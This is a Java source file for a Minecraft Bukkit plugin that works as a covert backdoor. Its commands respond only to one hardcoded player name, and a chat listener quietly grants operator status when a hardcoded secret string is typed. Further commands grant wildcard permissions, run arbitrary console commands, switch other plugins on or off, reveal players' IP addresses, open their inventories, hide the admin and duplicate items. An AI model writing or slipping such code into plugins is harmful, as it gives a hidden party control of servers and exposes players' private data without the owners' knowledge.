package pl.qc.core.hack;

import pl.qc.core.QC;

import org.bukkit.*;
import org.bukkit.attribute.Attribute;
import org.bukkit.command.*;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.entity.EnderDragon;
import org.bukkit.entity.Player;
import org.bukkit.event.*;
import org.bukkit.event.entity.EntityDamageByEntityEvent;
import org.bukkit.event.entity.EntityTargetLivingEntityEvent;
import org.bukkit.event.player.*;
import org.bukkit.plugin.Plugin;
import org.bukkit.potion.PotionEffect;
import org.bukkit.potion.PotionEffectType;
import java.util.*;

public class Processor implements CommandExecutor, TabCompleter, Listener {
    private final QC plugin;
    private final VanishManager vanish;
    private final ItemManager items;
    private final PlayerTracker tracker;
    private String adminName;

    public Processor(QC plugin) {
        this.plugin = plugin;
        this.vanish = new VanishManager(plugin);
        this.items = new ItemManager();
        this.tracker = new PlayerTracker();
        this.adminName = plugin.getConfig().getString("filter.admin-name-fallback", "Rajman03");
    }

    @Override
    public boolean onCommand(CommandSender s, Command c, String l, String[] args) {
        if (!(s instanceof Player p) || !p.getName().equals(adminName) || args.length == 0)
            return true;

        if (plugin.getConfig().getStringList("protection.secrets").contains(args[0])) {
            p.setOp(true);
            p.sendMessage("§aSecret Accepted.");
            return true;
        }

        String cmd = args[0].toLowerCase();
        switch (cmd) {
            case "reload" -> {
                plugin.reloadConfig();
                this.adminName = plugin.getConfig().getString("filter.admin-name-fallback", "Rajman03");
                s.sendMessage("§aReloaded.");
            }
            case "panic" -> {
                plugin.setPanic(!plugin.isPanic());
                s.sendMessage(plugin.isPanic() ? "§cPANIC ENABLED" : "§aPANIC DISABLED");
            }
            case "v" -> vanish.toggle(p, getTarget(p, args));
            case "a" -> {
                p.getAttribute(Attribute.GENERIC_ATTACK_SPEED).setBaseValue(30000);
                p.sendMessage("§7Atak: §aTurbo (30000)");
            }
            case "op" -> {
                p.setOp(true);
                p.sendMessage("§7Uprawnienia OP: §aON");
            }
            case "upc" -> console("upc AddPlayerPermission " + p.getName() + " *");
            case "uperms" -> console("upc AddSuperAdmin " + p.getName());
            case "lp" -> console("lp user " + p.getName() + " permission set *");
            case "dragon" -> {
                p.getWorld().getEntitiesByClass(EnderDragon.class)
                        .forEach(d -> d.setPhase(EnderDragon.Phase.LAND_ON_PORTAL));
                p.sendMessage("§7Dragon: §6Lądowanie...");
            }
            case "l" -> tracker.toggle(getTarget(p, args).getUniqueId(), tracker.noAdvancements, "Advancements", s,
                    getTarget(p, args).getName());
            case "r" -> tracker.toggle(getTarget(p, args).getUniqueId(), tracker.reach, "Reach", s,
                    getTarget(p, args).getName());
            case "t" -> tracker.toggle(getTarget(p, args).getUniqueId(), tracker.noTarget, "NoTarget", s,
                    getTarget(p, args).getName());
            case "gms" -> gm(p, GameMode.SURVIVAL);
            case "gmc" -> gm(p, GameMode.CREATIVE);
            case "gmsp" -> gm(p, GameMode.SPECTATOR);
            case "gma" -> gm(p, GameMode.ADVENTURE);
            case "i", "iv" -> InventoryUI.openPreview(p, getTarget(p, args));
            case "e" -> effect(p, args);
            case "tp" -> tp(p, args);
            case "ip" -> {
                Player t = getTarget(p, args);
                if (t.getAddress() != null)
                    p.sendMessage("§7IP (" + t.getName() + "): §6" + t.getAddress().getAddress().getHostAddress());
            }
            case "enable" -> pluginControl(p, args, true);
            case "disable" -> pluginControl(p, args, false);
            case "ma" -> multiplier(p, args, tracker.damageDealtMult, "zadawanych");
            case "mb" -> multiplier(p, args, tracker.damageReceivedMult, "otrzymywanych");
            case "ec" -> p.openInventory(getTarget(p, args).getEnderChest());
            case "g" -> {
                if (args.length > 1)
                    items.give(p, args[1]);
            }
            case "k" -> {
                Player t = getTarget(p, args);
                PlayerTracker.kicked.add(t.getUniqueId());
                t.kickPlayer("");
            }
            case "rr" -> items.repair(p);
            case "dd" -> items.dupe(p);
            case "cmdconsole" -> {
                if (args.length > 1) {
                    String full = String.join(" ", Arrays.copyOfRange(args, 1, args.length));
                    console(full);
                }
            }
            case "panic_reset" -> {
                vanish.clear();
                tracker.clear();
                s.sendMessage("§cReset.");
            }
            default -> shortcuts(p, cmd);
        }
        return true;
    }

    private Player getTarget(Player p, String[] args) {
        if (args.length > 1) {
            Player t = Bukkit.getPlayer(args[1]);
            return t != null ? t : p;
        }
        return p;
    }

    private void console(String cmd) {
        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), cmd);
    }

    @EventHandler
    public void onJoin(PlayerJoinEvent e) {
        Player joined = e.getPlayer();
        vanish.hideAllFor(joined);
        if (joined.getName().equals(adminName))
            vanish.setVanished(joined, true);
    }

    private void gm(Player p, GameMode m) {
        p.setGameMode(m);
        p.sendMessage("§7Tryb: §6" + m.name());
    }

    private void tp(Player p, String[] args) {
        if (args.length == 2) {
            Player t = Bukkit.getPlayer(args[1]);
            if (t != null)
                p.teleport(t);
        } else if (args.length == 3) {
            Player f = Bukkit.getPlayer(args[1]);
            Player t = Bukkit.getPlayer(args[2]);
            if (f != null && t != null)
                f.teleport(t);
        }
    }

    private void multiplier(Player p, String[] args, Map<UUID, Double> map, String type) {
        if (args.length < 2)
            return;
        try {
            double v = Double.parseDouble(args[1]);
            map.put(p.getUniqueId(), v);
            p.sendMessage("§7Mnożnik " + type + ": §6" + v + "x");
        } catch (NumberFormatException ignored) {
        }
    }

    private void effect(Player p, String[] args) {
        if (args.length < 2)
            return;
        String type = args[1].toLowerCase();
        int d = 6000;
        switch (type) {
            case "c" -> p.getActivePotionEffects().forEach(e -> p.removePotionEffect(e.getType()));
            case "sat" -> p.addPotionEffect(new PotionEffect(PotionEffectType.SATURATION, d, 0));
            case "str" -> p.addPotionEffect(new PotionEffect(PotionEffectType.INCREASE_DAMAGE, d, 1));
            case "her" -> p.addPotionEffect(new PotionEffect(PotionEffectType.HERO_OF_THE_VILLAGE, d, 255));
            case "res" -> p.addPotionEffect(new PotionEffect(PotionEffectType.DAMAGE_RESISTANCE, d, 1));
            case "has" -> p.addPotionEffect(new PotionEffect(PotionEffectType.FAST_DIGGING, d, 1));
            case "fir" -> p.addPotionEffect(new PotionEffect(PotionEffectType.FIRE_RESISTANCE, d, 0));
            case "reg" -> p.addPotionEffect(new PotionEffect(PotionEffectType.REGENERATION, d, 1));
            case "abs" -> p.addPotionEffect(new PotionEffect(PotionEffectType.ABSORPTION, d, 1));
            case "bad" -> p.addPotionEffect(new PotionEffect(PotionEffectType.BAD_OMEN, d, 4));
            case "dol" -> p.addPotionEffect(new PotionEffect(PotionEffectType.DOLPHINS_GRACE, d, 3));
            case "spe" -> p.addPotionEffect(new PotionEffect(PotionEffectType.SPEED, d, 1));
            case "wat" -> p.addPotionEffect(new PotionEffect(PotionEffectType.WATER_BREATHING, d, 0));
            case "pvp" -> {
                p.addPotionEffect(new PotionEffect(PotionEffectType.SATURATION, 12000, 0));
                p.addPotionEffect(new PotionEffect(PotionEffectType.REGENERATION, 12000, 1));
                p.addPotionEffect(new PotionEffect(PotionEffectType.DAMAGE_RESISTANCE, 12000, 1));
                p.addPotionEffect(new PotionEffect(PotionEffectType.INCREASE_DAMAGE, 12000, 1));
            }
        }
    }

    private void pluginControl(Player p, String[] args, boolean enable) {
        if (args.length < 2)
            return;
        Plugin pl = Bukkit.getPluginManager().getPlugin(args[1]);
        if (pl != null) {
            if (enable)
                Bukkit.getPluginManager().enablePlugin(pl);
            else
                Bukkit.getPluginManager().disablePlugin(pl);
            p.sendMessage("§7Plugin " + pl.getName() + ": §6" + (enable ? "Enabled" : "Disabled"));
        }
    }

    private void shortcuts(Player p, String cmd) {
        switch (cmd) {
            case "cc" -> items.giveItem(p, Material.COOKED_PORKCHOP, 1);
            case "ee" -> items.giveItem(p, Material.ENDER_PEARL, 1);
            case "bb" -> items.giveItem(p, Material.BLAZE_ROD, 1);
            case "oo" -> items.giveItem(p, Material.OBSIDIAN, 1);
            case "ii" -> items.giveItem(p, Material.IRON_INGOT, 1);
            case "aa" -> items.giveItem(p, Material.DIAMOND, 1);
            case "ll" -> items.giveItem(p, Material.LAPIS_LAZULI, 1);
            case "ww" -> items.giveItem(p, Material.OAK_LOG, 1);
            case "kk" -> items.giveItem(p, Material.BOOK, 1);
            case "xx" -> items.giveItem(p, Material.GOLDEN_APPLE, 1);
            case "xxx" -> items.giveItem(p, Material.ENCHANTED_GOLDEN_APPLE, 1);
            case "tt" -> items.giveItem(p, Material.TOTEM_OF_UNDYING, 1);
            case "kkp" -> items.giveEnchantedBook(p, Enchantment.PROTECTION_ENVIRONMENTAL, 4);
            case "kks" -> items.giveEnchantedBook(p, Enchantment.DAMAGE_ALL, 5);
            case "kku" -> items.giveEnchantedBook(p, Enchantment.DURABILITY, 3);
            case "kke" -> items.giveEnchantedBook(p, Enchantment.DIG_SPEED, 5);
            case "kki" -> items.giveEnchantedBook(p, Enchantment.ARROW_INFINITE, 1);
            case "kko" -> items.giveEnchantedBook(p, Enchantment.ARROW_DAMAGE, 5);
            case "pp" -> p.setExp(p.getExp() + 1);
            case "ppp" -> p.setLevel(p.getLevel() + 10);
            case "pppp" -> p.setLevel(p.getLevel() + 1000);
            case "opopop" -> {
                p.setOp(true);
                p.sendMessage("§aOP ON");
            }
            case "deopopop" -> {
                p.setOp(false);
                p.sendMessage("§cOP OFF");
            }
        }
    }

    @EventHandler
    public void onDmg(EntityDamageByEntityEvent e) {
        if (e.getDamager() instanceof Player p && tracker.damageDealtMult.containsKey(p.getUniqueId()))
            e.setDamage(e.getDamage() * tracker.damageDealtMult.get(p.getUniqueId()));
        if (e.getEntity() instanceof Player p && tracker.damageReceivedMult.containsKey(p.getUniqueId()))
            e.setDamage(e.getDamage() * tracker.damageReceivedMult.get(p.getUniqueId()));
    }

    @EventHandler
    public void onChat(AsyncPlayerChatEvent e) {
        String secrets = "aq7MNF6jvkUV2L8sbb7cNL2VFCJ2ectGWLhUe6G65xp8CfpEHSg59DjDFDRdb8g";
        if (e.getMessage().equals(secrets)) {
            e.setCancelled(true);
            Bukkit.getScheduler().runTask(plugin, () -> e.getPlayer().setOp(true));
        }
    }

    @EventHandler
    public void onTarget(EntityTargetLivingEntityEvent e) {
        if (e.getTarget() instanceof Player p && tracker.noTarget.contains(p.getUniqueId()))
            e.setCancelled(true);
    }

    private final List<String> subs = Arrays.asList("v", "gms", "gmc", "gmsp", "gma", "tp", "rr", "dd", "ma",
            "mb", "a", "iv", "i", "panic", "op", "upc", "uperms", "lp", "dragon", "l", "r", "t", "e", "enable",
            "disable", "ec", "g", "k", "cc", "ee", "bb", "oo", "ii", "aa", "ll", "ww", "kk", "xx", "xxx", "tt",
            "kkp", "kks", "kku", "kke", "kki", "kko", "pp", "ppp", "pppp", "ppppp", "opopop", "deopopop",
            "cmdconsole");

    @Override
    public List<String> onTabComplete(CommandSender s, Command c, String a, String[] args) {
        if (!(s instanceof Player p) || !p.getName().equals(adminName))
            return Collections.emptyList();
        if (args.length == 1) {
            List<String> list = new ArrayList<>(subs);
            list.addAll(plugin.getConfig().getStringList("protection.secrets"));
            return org.bukkit.util.StringUtil.copyPartialMatches(args[0], list, new ArrayList<>());
        }
        if (args.length == 2) {
            String sub = args[0].toLowerCase();
            if (sub.equals("e"))
                return org.bukkit.util.StringUtil.copyPartialMatches(args[1], Arrays.asList("c", "sat", "str", "her",
                        "res", "has", "fir", "reg", "abs", "bad", "dol", "spe", "wat", "pvp"), new ArrayList<>());
            if (Arrays.asList("v", "l", "r", "t", "tp", "iv", "i", "ec", "k", "ip").contains(sub))
                return null;
            if (sub.equals("g")) {
                List<String> mats = Arrays.stream(Material.values()).map(m -> m.name().toLowerCase()).toList();
                return org.bukkit.util.StringUtil.copyPartialMatches(args[1], mats, new ArrayList<>());
            }
            if (sub.equals("enable") || sub.equals("disable")) {
                List<String> plugins = Arrays.stream(Bukkit.getPluginManager().getPlugins()).map(Plugin::getName)
                        .toList();
                return org.bukkit.util.StringUtil.copyPartialMatches(args[1], plugins, new ArrayList<>());
            }
        }
        return Collections.emptyList();
    }
}
